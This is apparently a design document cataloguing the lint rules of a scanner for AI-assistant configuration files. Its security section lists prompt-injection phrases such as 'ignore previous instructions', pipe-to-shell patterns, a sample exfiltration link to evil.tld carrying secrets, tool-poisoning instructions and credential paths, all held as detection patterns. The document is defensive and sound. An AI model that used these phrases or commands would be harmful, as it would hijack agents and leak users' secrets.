# 03 — Rule catalog

## Conventions

- ID: `AI-<CAT>-<NNN>`. CAT ∈ `SEC` (Security → Vulnerability), `STR` (Structure → Bug), `EFF` (Efficiency → Context smell), `COG` (Cognitive → Clarity smell). Numbers are never reused.
- Severities: `Critical`, `High`, `Medium`, `Low`, `Info`. Defaults are listed per rule and can be overridden in `pulse.toml`.
- **Scope**: `asset` rules implement `Rule`; `project` rules implement `ProjectRule` and see all assets.
- **Kinds**: `all`, `md` (every Markdown-based kind), or explicit kinds.
- Each rule ships: implementation, `fail_*`/`pass_*` fixtures, and `docs/rules/<ID>.md` (see the `add-rule` skill).
- The **Phase** column says which roadmap phase implements the rule.

## Index

| ID | Name | Sev | Scope | Phase |
|---|---|---|---|---|
| AI-SEC-001 | Invisible or bidirectional Unicode | Critical | asset | 2 |
| AI-SEC-002 | Prompt-injection phrase | Critical | asset | 2 |
| AI-SEC-003 | Hardcoded secret | Critical | asset | 3 |
| AI-SEC-004 | MCP credential not externalized | High | asset | 3 |
| AI-SEC-005 | Unpinned MCP server package | High | asset | 3 |
| AI-SEC-006 | Insecure MCP transport | High | asset | 3 |
| AI-SEC-007 | Over-permissive agent permissions | High | asset | 3 |
| AI-SEC-008 | Remote code execution in hook | Critical | asset | 3 |
| AI-SEC-009 | Unsafe interpolation in hook command | High | asset | 3 |
| AI-SEC-010 | Data-exfiltration pattern | High | asset | 3 |
| AI-SEC-011 | Hidden instructions | High | asset | 3 |
| AI-SEC-012 | Tool description poisoning | Critical | asset | 3 |
| AI-SEC-013 | Sensitive path reference | Medium | asset | 3 |
| AI-STR-001 | Invalid or missing frontmatter | High | asset | 4 |
| AI-STR-002 | Invalid file content | High | asset | 2 |
| AI-STR-003 | Broken reference or import | Medium | project | 4 |
| AI-STR-004 | Name / description constraint violated | Medium | asset | 4 |
| AI-STR-005 | Unknown tool in allow-list | Medium | asset | 4 |
| AI-STR-006 | Invalid hook definition | High | asset | 4 |
| AI-STR-007 | Duplicate asset name | High | project | 4 |
| AI-STR-008 | Asset not loaded from its location | Medium | project | 8 |
| AI-EFF-001 | Asset over token budget | High | asset | 2 |
| AI-EFF-002 | Always-on context over budget | High | project | 2 |
| AI-EFF-003 | Duplicated content | Medium | project | 5 |
| AI-EFF-004 | Inlined bulk content | Medium | asset | 5 |
| AI-EFF-005 | MCP server/tool sprawl | Medium | project | 5 |
| AI-EFF-006 | Oversized skill or agent | Medium | asset | 5 |
| AI-EFF-007 | Filler phrasing | Low | asset | 5 |
| AI-COG-001 | Contradictory directives | Medium | asset | 2 |
| AI-COG-002 | Vague directive | Low | asset | 5 |
| AI-COG-003 | Negative-only constraint | Info | asset | 5 |
| AI-COG-004 | Emphasis inflation | Low | asset | 5 |
| AI-COG-005 | Cross-file contradiction | Medium | project | 5 |
| AI-COG-006 | Weak routing description | Medium | asset | 5 |
| AI-COG-007 | Unstructured long instructions | Low | asset | 5 |

---

## Security (SEC)

### AI-SEC-001 — Invisible or bidirectional Unicode
- **Sev** Critical · **Kinds** all · **Inline-suppressible** no
- **Detect** Code points: U+200B–U+200F, U+202A–U+202E, U+2060–U+2064, U+2066–U+2069, U+FEFF (except at offset 0), U+00AD, U+180E, tag block U+E0000–U+E007F ("ASCII smuggling"), and variation selectors U+FE00–U+FE0F / U+E0100–U+E01EF when not preceded by an emoji base. Single pass with `memchr` on lead bytes 0xE2/0xEF/0xF3/0xC2/0xE1, then decode.
- **Report** One finding per contiguous run: `Invisible character(s) U+202E RIGHT-TO-LEFT OVERRIDE (×3)` (the count only when > 1; `and others` after the first name when the run mixes code points). For runs containing tag characters, decode the hidden ASCII payload (printable tags only, truncated to 80 chars): `Hidden tag text (×27): "ignore all previous rules"`.
- **Fix** Remove the characters. `pulse fix` (future) strips them automatically.
- **FP guards** U+200D inside emoji ZWJ sequences (between two non-ASCII emoji code points; an allowed variation selector keeps the sequence going) is allowed. Variation selectors after an ASCII keycap base (`#`, `*`, `0`–`9`) are allowed.

### AI-SEC-002 — Prompt-injection phrase
- **Sev** Critical · **Kinds** all except Settings · **Inline-suppressible** no
- **Detect** Aho-Corasick over `normalized()` text with the `lexicon::INJECTION` list (≥ 40 phrases), e.g. "ignore (all) previous instructions", "disregard the above", "system override", "you are now in developer mode", "new instructions:", "forget everything", "do not tell the user", "act as dan", "</system>", "<|im_start|>", "[[system]]". Phrases are stored pre-normalized; small variants (all/any/prior/previous/above) are expanded at build time.
- **Report** `Prompt-injection phrase "ignore previous instructions"`.
- **FP guards** Skip matches inside fenced code blocks whose info string is `text`/`example`, and inside a section whose heading contains "injection" / "security" / "example attack" (this downgrades severity to Low, it does not drop the finding). Users can add allow-listed phrases in config.

### AI-SEC-003 — Hardcoded secret
- **Sev** Critical · **Kinds** all · **Inline-suppressible** no
- **Detect** Regex set (`RegexSet` prefilter, then individual regexes for spans): AWS `AKIA[0-9A-Z]{16}`, GitHub `gh[pousr]_[A-Za-z0-9]{36,}` / `github_pat_…`, OpenAI `sk-(proj-)?[A-Za-z0-9_-]{20,}`, Anthropic `sk-ant-[A-Za-z0-9_-]{20,}`, Slack `xox[abprs]-…`, Google `AIza[0-9A-Za-z_-]{35}`, Stripe `sk_live_…`, private-key PEM headers, JWT `eyJ…\.eyJ…\.…`, plus generic `(api[_-]?key|token|secret|password)\s*[:=]\s*["']?([^\s"']{12,})` gated by Shannon entropy ≥ 3.5 bits/char.
- **Report** `Possible <provider> secret`, with the secret redacted (first 4 chars + `…`).
- **FP guards** Ignore obvious placeholders (`xxx`, `<…>`, `${…}`, `your-`, `example`, `dummy`, `changeme`, all-same-char), plus `$VAR`, `{{…}}` and env lookups; see ADR-020). The generic key may have a `[a-z_]*` suffix and a closing quote before `:`/`=` (no newline across the separator), and its value needs a digit and must not look like code (calls, dotted paths, URLs, `/`-separated words); OpenAI matches need mixed case and a digit; the span is the secret value; overlapping matches keep the earlier provider (ADR-020).

### AI-SEC-004 — MCP credential not externalized
- **Sev** High · **Kinds** McpConfig
- **Detect** A value in `env`, `headers` or `args` (after a `--token`/`--api-key`/`--password`-like flag) whose key matches `(?i)(key|token|secret|password|auth|bearer)` and whose value is a literal, i.e. not `${env:X}`, `${input:X}`, `${X}`, `$X` or empty.
- **Fix** Reference an environment variable or VS Code `inputs` (`promptString`, `password: true`).
- **Note** When AI-SEC-003 also fires on the same span, keep only AI-SEC-003 (the engine dedups by span with severity precedence).
- **FP guards** A value containing a reference anywhere (`Bearer ${input:X}`), an obvious placeholder (AI-SEC-003 list), a switch/number (`true`, `off`, `4096`), a path or a URL without userinfo is not literal; keys ending in `file`/`path`/`dir`/`url`/`uri`/`type`/`enabled`/`mode` are skipped; Docker `-e KEY=value` args count as env; the span is the value without quotes (ADR-021).

### AI-SEC-005 — Unpinned MCP server package
- **Sev** High · **Kinds** McpConfig
- **Detect** stdio servers whose command is `npx`/`pnpm dlx`/`bunx`/`yarn dlx` with a package arg lacking `@<version>` (or using `@latest`); `uvx`/`pipx run` without `==version` / `@version`; `docker run` with an image lacking a tag/digest or tagged `:latest`. Using `-y`/`--yes` adds "auto-install" to the message.
- **Detail** npm pinned = exact `MAJOR.MINOR.PATCH[-pre][+build]` (ranges, partial versions and dist-tags are unpinned); `--package`/`--from`/`--spec` values are the packages when present, else the first positional arg; `uv tool run` counts as `uvx`; local paths, URLs, `git+`/protocol specs and variables are skipped (ADR-021).
- **Fix** Pin an exact version (or a digest for Docker).

### AI-SEC-006 — Insecure MCP transport
- **Sev** High · **Kinds** McpConfig
- **Detect** HTTP/SSE server URL with scheme `http://` and host not in {`localhost`, `127.0.0.1`, `::1`, `*.localhost`}. Medium when the host is a private IP (RFC 1918).
- **Detail** URLs whose host is a variable (`${…}`) are skipped and all of `127.0.0.0/8` is loopback; `httpUrl`/`serverUrl` count as the URL (ADR-021).

### AI-SEC-007 — Over-permissive agent permissions
- **Sev** High · **Kinds** all (Settings, Agent, Prompt, McpConfig checks; bypass flags in any asset, ADR-022)
- **Detect**
  - Settings: `permissions.allow` contains `Bash`, `Bash(*)`, `Bash(:*)`, or `*`; `WebFetch` without a domain; `defaultMode: "bypassPermissions"`; `enableAllProjectMcpServers: true` (Medium).
  - Agent/Prompt frontmatter: `allowed-tools`/`tools` containing unrestricted `Bash`. This is Medium, because subagents legitimately use it, and High when combined with `WebFetch`/network tools (exfiltration chain).
  - Any asset: text containing `--dangerously-skip-permissions` or `--yolo`.
  - McpConfig: `alwaysAllow` / `autoApprove` lists containing write/exec tools or `*`.

### AI-SEC-008 — Remote code execution in hook
- **Sev** Critical · **Kinds** Settings, Hooks, Skill, Prompt · **Inline-suppressible** no
- **Detect** In hook commands (and in fenced `bash`/`sh` blocks of skills/commands with `!` execution), match pipe-to-shell: `(curl|wget|iwr|Invoke-WebRequest)[^|]*\|\s*(sudo\s+)?(sh|bash|zsh|python3?|node|iex)`, `bash <(curl …)`, `eval "$(curl …)"`, plus base64 decode piped to a shell. Fences: `bash`/`sh`/`shell`/`zsh` in skill and prompt bodies, plus `` !`cmd` `` lines (ADR-023).

### AI-SEC-009 — Unsafe interpolation in hook command
- **Sev** High · **Kinds** Settings, Hooks
- **Detect** Hook commands that interpolate tool input unquoted into a shell, e.g. `$(jq -r .tool_input.command)` or `$CLAUDE_FILE_PATHS` / `${file}` outside double quotes, or passed to `eval`/`sh -c`. Also a tool-input stage piped into `xargs` (ADR-023).
- **Fix** Quote expansions; pass data via stdin or arguments; never `eval` tool input.

### AI-SEC-010 — Data-exfiltration pattern
- **Sev** High · **Kinds** md, Tools
- **Detect** (a) Markdown images/links whose URL contains template placeholders or query params fed by context (`{…}`, `{{…}}`, `$…`, `<data>`), e.g. `![](https://evil.tld/?q={secrets})`; (b) imperative sentences that combine a send verb (`send`, `post`, `upload`, `exfiltrate`, `forward`, `include … in the url`) with a sensitive object (`env`, `secrets`, `credentials`, `api key`, `token`, `conversation`, `ssh`) within one sentence; (c) instructions to `curl`/`fetch` a non-allowlisted domain with data (a data flag or a templated URL). Placeholders count in a URL's host, query or fragment; a single-brace path segment (`/{owner}/{repo}/badge.svg`) is a documentation template and counts only in its `{{…}}`/`$…`/`<…>` forms, and only for images. (b) needs the verb to open its clause and no negator in the three words before it (ADR-024).
- **Config** `allowed_domains`.

### AI-SEC-011 — Hidden instructions
- **Sev** High · **Kinds** md
- **Detect** Content the model reads but a human reviewer may not see: HTML comments (`<!-- -->`) containing imperative directives (they start with a verb from `lexicon::IMPERATIVES`, or contain `you must`/`always`/`never`) or injection phrases; elements with `display:none` / `hidden`; base64 blobs ≥ 40 chars outside code fences; text-to-whitespace ratios suggesting padding (≥ 200 consecutive spaces/newlines followed by text).
- **FP guards** Pulse suppression comments, markdownlint/prettier directives, generated-file notices and license headers are ignored for the directive check; injection phrases are reported in any comment. Hidden HTML is read from parsed attributes (ADR-024).

### AI-SEC-012 — Tool description poisoning
- **Sev** Critical · **Kinds** Tools, McpConfig (when inline tool metadata exists), Skill (frontmatter description)
- **Detect** Tool or skill descriptions that contain injection phrases, `<IMPORTANT>`-style hidden-instruction tags, instructions to read files or credentials ("read ~/.ssh", "pass the contents of"), instructions to call other tools, or instructions to conceal behavior from the user ("do not mention", "don't tell the user").

### AI-SEC-013 — Sensitive path reference
- **Sev** Medium · **Kinds** all
- **Detect** References to `~/.ssh`, `id_rsa`, `id_ed25519`, `~/.aws/credentials`, `.env` (as a read target, not in `.gitignore` advice), `/etc/passwd`, `/etc/shadow`, `~/.config/gh/hosts.yml`, `.npmrc`, `.pypirc`, keychain, browser profile directories.
- **FP guards** Downgrade to Info inside deny-list contexts (`permissions.deny`, sentences containing "never read"/"do not access").

---

## Structure (STR)

### AI-STR-001 — Invalid or missing frontmatter
- **Sev** High · **Kinds** Skill, Agent, Prompt, ScopedInstructions
- **Detect** YAML parse errors (report the YAML error line), unterminated `---`, or missing required keys. Required: Skill → `name`, `description`; Claude Agent → `name`, `description`; `.mdc` → at least one of `description`/`globs`/`alwaysApply`; `.instructions.md` → `applyTo`. Unknown keys → Low (typo hint via Levenshtein ≤ 2 against the known keys). YAML parse errors are reported once, by AI-STR-002 (ADR-025). Platform comes from the path; Claude commands, `.prompt.md` and `.agent.md` have no required keys but are checked for unknown ones; `.prompty`, `.claude/rules`, Windsurf and Cline have no schema.

### AI-STR-002 — Invalid file content
- **Sev** High · **Kinds** all
- **Detect** Invalid UTF-8 (lossy-decoded), JSON/JSONC parse error, wrong top-level shape for the kind (e.g. `mcpServers` not an object), files over `max_file_bytes` (Info, "skipped").

### AI-STR-003 — Broken reference or import
- **Sev** Medium · **Kinds** md · **Scope** project
- **Detect** `@path` imports (CLAUDE.md), relative Markdown links, and paths in skill bodies (`scripts/x.py`, `references/y.md`) that do not exist relative to the asset (or to the root for `@/`). Skip URLs, anchors-only links and paths in code fences that look like examples (contain `<`, `your-`, `example`). Import cycles (≤ 5 hops) → High. `@` tokens without `/` or `.` are mentions, not imports (ADR-027). A skill path shown only as code (code span or block) is reported only when its first directory exists in the skill or at the root (a likely typo) or a command runs it (`python`, `node`, `bash`, `uv run`, … in `lexicon::shell::SCRIPT_RUNNERS`); otherwise it is a file the skill produces or asks for (ADR-046).

### AI-STR-004 — Name / description constraint violated
- **Sev** Medium · **Kinds** Skill, Agent, Prompt
- **Detect** Skill `name` not matching `^[a-z0-9]+(-[a-z0-9]+)*$`, longer than 64 chars, or different from its directory name; `description` empty or longer than 1024 chars; reserved words in names (`anthropic`, `claude`) for skills.

### AI-STR-005 — Unknown tool in allow-list
- **Sev** Medium · **Kinds** Agent, Prompt, Settings
- **Detect** `tools`/`allowed-tools`/permission entries naming a tool that is neither a known built-in (list in `lexicon::KNOWN_TOOLS`, per platform) nor `mcp__<server>__<tool>` with `<server>` defined in a discovered McpConfig. Levenshtein suggestion in the message.
- **Scope** Project rule. Claude Code (settings, `.claude/agents`, `.claude/commands`): closed built-in list (`lexicon::platform::CLAUDE_TOOLS`); Copilot (`.github/…`, and `*.agent.md`/`*.prompt.md` anywhere): only one-edit typos of `COPILOT_TOOLS`, compared case-insensitively, with the Copilot aliases (`COPILOT_TOOL_ALIASES`: `Read`, `shell`, `Bash`, `Task`, …) accepted (ADR-046). **FP guards** `mcp__` entries are not checked when the project has no McpConfig, nor for implicit servers (`ide`, `claude_ai_*`, `plugin_*`) or wildcards (ADR-026).

### AI-STR-006 — Invalid hook definition
- **Sev** High · **Kinds** Settings, Hooks
- **Detect** Unknown event name (vs `lexicon::platform::{CLAUDE,CURSOR,COPILOT}_HOOK_EVENTS`, Cursor for `.cursor/hooks.json`, Copilot for `.github/hooks/` or hooks using the Copilot keys `bash`/`powershell`/`timeoutSec`; ADR-046), missing `command`/`prompt` on a command/prompt hook, `type` not in the platform's list (Claude: `command`, `prompt`, `http`, `mcp_tool`, `agent`; Cursor: `command`, `prompt`; Copilot: `command`, whose command is `bash`, else `powershell`), matcher that is not a valid regex (`*`, `""` and plain `A|B` lists are not regexes; JS look-around/backreferences are skipped), `timeout` (Copilot `timeoutSec`) ≤ 0 or > 600 s (Medium), a referenced script path (`./…`, `$CLAUDE_PROJECT_DIR/…`, `${CLAUDE_PLUGIN_ROOT}/…`, or relative with a script extension) that does not exist (Medium, ADR-026).

### AI-STR-007 — Duplicate asset name
- **Sev** High · **Kinds** Skill, Agent, Prompt · **Scope** project
- **Detect** Two assets of the same kind and platform resolving to the same invocation name (skill `name`, agent `name`, command path → `/name`). Report on the second occurrence, pointing at the first. Platform = first platform dir in the path (`.claude`, `.github`, …), else the asset folder's parent (plugin `skills/`); without frontmatter `name`, the folder or file stem (ADR-028).

### AI-STR-008 — Asset not loaded from its location
- **Sev** Medium · **Kinds** Instructions, ScopedInstructions, Skill, Agent, Prompt, Hooks, McpConfig · **Scope** project · not inline-suppressible
- **Detect** (load locations per assistant: ADR-042) (1) assets found only by discovery row 10 (`Origin::LibraryRow`: outside `scan.library`), outside plugin folders (the folder or an ancestor holds `plugin.json`, `.claude-plugin/plugin.json` or `.github/plugin/plugin.json`): one finding per (folder, kind) at its first file, naming the expected folder (`.github/agents/`, `.github/prompts/`, `.github/instructions/`, `.github/hooks/`, `.vscode/mcp.json`); hook configs group at the folder above their own (`hooks/<name>/hooks.json` → `hooks/`). (2) A `SKILL.md` from rows 1–9 whose grandparent folder is not `skills`, when its path has a platform folder (`.claude`, `.github`, `.agents`, `.kiro`) or a `skills` folder; otherwise (a repo that is one skill) it is not reported. (3) Non-asset files with a near-miss name or folder, found by a name check during the walk (no content read), outside `scan.library`: `.md` under `.github/agent/`, `.github/instruction/`, `.github/prompt/`, `.claude/agent/`, `.claude/command/`, `.claude/skill/`, `.kiro/steerings/`, `.kiro/skill/`, `.kiro/hook/`, `.kiro/agent/`, plus `.json` and `.hook` files under `.kiro/hook/` and `.kiro/agent/` (ADR-049); `skill.md`/`Skill.md`; `copilot-instruction.md`; `copilot-instructions.md` outside `.github/`; `claude.md`/`Claude.md` (any non-canonical case: loads on case-insensitive file systems only); `*.mdc` outside `.cursor/rules/`. `*.agent.md` directly in `.github/` and in `.github/agent/` are row-10 assets, so case (1) reports them. Findings at line 1; for non-assets the fingerprint uses the root-relative path.

---

## Efficiency (EFF)

Every EFF finding sets `token_waste`, which feeds context debt (`04-scoring-gate.md`).

### AI-EFF-001 — Asset over token budget
- **Sev** High (Medium when ≤ 125% of budget) · **Kinds** all
- **Detect** `tokens(asset) > budget(kind)`. Defaults (`[budgets]`): instructions 3000, scoped_instructions 1500, agent 2500, prompt 2000, skill 5000 (body), tools 3000, custom 3000.
- **token_waste** `tokens - budget`.

### AI-EFF-002 — Always-on context over budget
- **Sev** High · **Scope** project
- **Detect** Σ Always tokens (root instructions + resolved `@imports` + alwaysApply rules + skill/agent descriptions + tool schemas) of the assistant that loads the most (ADR-045; an import counts for the assistants of the file that imports it) > `budgets.always_on` (default 8000). The finding points at that assistant's largest contributor and lists its top 5 contributors with their tokens; the message names the assistant (`Always-on context for Copilot …`) when their totals differ.
- **token_waste** `total - budget`.

### AI-EFF-003 — Duplicated content
- **Sev** Medium · **Kinds** md · **Scope** project
- **Detect** Paragraph-level near-duplicates within and across assets: 5-word shingles (xxh3 over normalized words) → 32-bin one-permutation MinHash per paragraph (≥ 25 words); LSH over 8 single-bin bands finds candidates, and ≥ 16 agreeing bins (estimated Jaccard ≥ 0.5) means a duplicate (ADR-029). Exact duplicate lines (≥ 8 words, outside code and reported paragraphs) across always-on assets are also reported, at **Low** (P8.7). Reported on the later occurrence in path order.
- **FP guards** Two assets are compared only when one's context root (folder above a platform dir or `skills/`, else the asset's folder) contains the other's.
- **token_waste** Tokens of the duplicate occurrence(s).

### AI-EFF-004 — Inlined bulk content
- **Sev** Medium · **Kinds** md
- **Detect** In Always/Conditional assets (not skill/agent bodies): a code block > 40 content lines, a table > 25 body rows, or a JSON/YAML dump (a `json`/`jsonc`/`json5`/`yaml`/`yml` block) > 60 content lines. Suggest moving it to a referenced file (it is then loaded on demand). See ADR-030.
- **token_waste** Block tokens minus 20 (the cost of a reference line).

### AI-EFF-005 — MCP server/tool sprawl
- **Sev** Medium · **Scope** project
- **Detect** Enabled MCP servers (distinct names across configs; `disabled: true`/`enabled: false` excluded) > `budgets.mcp_servers` (default 8), or tools in Tools assets > `budgets.tools_count` (default 40). Duplicate server definitions (same command+args or URL under different names) → High. See ADR-030.
- **token_waste** Tokens of the tool definitions past the budget (0 for server findings).

### AI-EFF-006 — Oversized skill or agent
- **Sev** Medium · **Kinds** Skill, Agent
- **Detect** Skill body > 500 lines, or skill/agent `description` > `budgets.description` tokens (default 150). The description is always-on.
- **token_waste** Description tokens over budget; for a long body, the tokens past line 500.

### AI-EFF-007 — Filler phrasing
- **Sev** Low · **Kinds** md
- **Detect** `lexicon::FILLER` hits on normalized text ("please note that", "it is important to note", "make sure to always", "you are a helpful assistant", "as an ai", "in order to" → "to", "feel free to", "basically", "very very"). One aggregated finding per asset when there are ≥ 3 hits, listing the top phrases; otherwise one per hit at Info.
- **token_waste** Σ (phrase tokens − replacement tokens).

---

## Cognitive (COG)

### AI-COG-001 — Contradictory directives
- **Sev** Medium · **Kinds** md
- **Detect**
  1. Split the body (outside code fences) into sentences or list items. A **directive** is a sentence with a polarity marker: positive {`always`, `must`, `should`, `use`, `prefer`, `do`} or negative {`never`, `must not`, `don't`, `do not`, `avoid`, `no`}. Extract the **object**: the 1–4 content words after the verb, with stop words removed and naive lemmas (strip plural `s`).
  2. **Opposite polarity, same object** (e.g. "Always use semicolons" / "Never use semicolons") → finding.
  3. **Mutually exclusive choices**: both members of a set in `lexicon::EXCLUSIVE_SETS` are prescribed positively (e.g. {typescript, javascript}, {tabs, spaces}, {npm, yarn, pnpm, bun}, {single quotes, double quotes}, {jest, vitest}, {snake_case, camelCase}) → finding. Users can extend this with `[rules.AI-COG-001] exclusive = [[...]]`.
- **Report** On the second directive, referencing the first: `Contradicts line 12: "Always use TypeScript" vs "Use plain JavaScript"`.
- **FP guards** Skip if either sentence has a scoping qualifier (`when`, `if`, `for`, `in`, `except`, `unless`, `only`) followed by different contexts, or if the two directives are in sections whose headings name different scopes (e.g. "Frontend" vs "Scripts"). Also skip a negative directive whose object is more specific than the positive one ("Always use TypeScript" / "Never use TypeScript enums"); a heading names a scope unless all its words are generic (`lexicon::directives::GENERIC_HEADINGS`: "Code style", "Rules", …), and the guard needs both headings to name scopes (ADR-015).

### AI-COG-002 — Vague directive
- **Sev** Low · **Kinds** md
- **Detect** Directive sentences containing `lexicon::VAGUE` terms ("appropriate(ly)", "as needed", "properly", "best practices", "clean code", "etc.", "and so on", "some", "reasonable", "if necessary", "good", "nice") without a concrete anchor (number, code span, path or example) in the same sentence, nor a list or table right after a sentence ending in `:` (P8.7). Aggregated per asset like AI-EFF-007.
- **Directive** (AI-COG-002, AI-COG-004) A sentence with an AI-COG-001 marker anywhere, or a verb from `lexicon::IMPERATIVES` / `lexicon::style::DIRECTIVE_VERBS` opening a clause (`Write …`, `IMPORTANT: run …`) (ADR-031).

### AI-COG-003 — Negative-only constraint
- **Sev** Info / Low · **Kinds** md
- **Prohibition** An imperative negation opening a clause (the sentence start or after a `:` label, optionally after `please`/`also`/`otherwise`…): `Do not`, `Don't`, `Never`, `Avoid`, `You`/`We` + `must`/`should`/`shall` + `not`/`never`, `mustn't`/`shouldn't`. Not prohibitions: statements of fact ("They do not have …", "You do not need to …"), purpose clauses ("To avoid …"), `No X` noun phrases and labels, quoted or code-span text, headings (ADR-043).
- **Detect** (1) Info: a prohibition whose object (up to the first `QUALIFIERS`/`TERMINATORS` word) has a `lexicon::VAGUE` term or a vague limit (unnecessary, too much/many, excessive, verbose, bad, wrong), is not concrete (code span, quoted literal, path, number, file name) and has no alternative in the same or the next sentence (`instead`, `use`, `prefer`, `rather`; `use` directly after a negator doesn't count). FP guards (ADR-032): a contrast after `,`/`—` that already states the positive, or a later clause opening with an imperative after `,`/`:`/`and`/`but` ("…: redact them", "… and focus on X"). Aggregated per asset like AI-EFF-007. (2) Low, once per asset at the first prohibition: prohibitions are ≥ 60% of its directives (AI-COG-002 definition) and ≥ 8.
- **Fix** (1) State what to do instead. (2) Lead with what good output looks like, then the limits.

### AI-COG-004 — Emphasis inflation
- **Sev** Low · **Kinds** md
- **Detect** Per asset: the share of directive sentences containing emphasis markers (`IMPORTANT`, `CRITICAL`, `MUST`, `NEVER` in caps, ≥ 2 `!`, a fully bold sentence, ALL-CAPS words ≥ 4 letters excluding acronyms in `lexicon::ACRONYMS`). Report when the share is > 25% and there are ≥ 4 emphasized directives. When everything is emphasized, nothing is. Bold used as structure is not emphasis (P8.7): table cells, a bold label ending in `:` (`**Output (…):**`), and ALL-CAPS words in a `**Term**:` lead-in (the `EMPHASIS` words still count).

### AI-COG-005 — Cross-file contradiction
- **Sev** Medium · **Scope** project
- **Detect** AI-COG-001 logic applied across assets that load together: root Always instructions + `@imports` + alwaysApply rules, and per-directory chains (a nested `CLAUDE.md` with its ancestors). Reuses the directive extraction from AI-COG-001 (shared module `cognitive::directives`).
- **Report** On the directive in the file loaded later (the nested file; in the always-on set, the later path or the imported file), referencing the earlier one: `Contradicts CLAUDE.md:3: "Use pnpm" vs "Use npm"`. Pairs within one file are AI-COG-001's. A document title (first heading, level 1) is not a section scope across files (ADR-033).

### AI-COG-006 — Weak routing description
- **Sev** Medium · **Kinds** Skill, Agent
- **Detect** Description < 20 words, or lacking a trigger cue (`use when`, `use for`, `when the user`, `proactively`, `trigger`, `invoke`; see ADR-032 for the matched forms), or written in first person ("I can…"). The model routes on descriptions, so weak ones cause missed or wrong invocations.

### AI-COG-007 — Unstructured long instructions
- **Sev** Low · **Kinds** Instructions, ScopedInstructions, Agent, Skill
- **Detect** Body > 60 lines with < 2 headings, or a paragraph > 150 words.

---

## Custom rules (declarative)

Users define custom rules in `pulse.toml` (see `05-cli-config.md`). Each has an `id` (must start with `X-`), `severity`, `kinds`, `message`, and one matcher: `pattern` (regex on source), `phrases` (Aho-Corasick on normalized text), or `max_tokens`. They run through the same engine path as built-in rules. A `pattern` match is reported at its source span with the configured message (the match is not quoted, so patterns can target secrets); `phrases` match like the lexicon rules (normalized text, word bounds, longest phrase wins); `max_tokens` reports once at the top of the file with `(<n> tokens > <max>)` appended. Custom rules have no category: they appear in `pulse rules` (JSON `category: null`, excluded by `--category`), are inline-suppressible and don't count toward ratings or context debt.
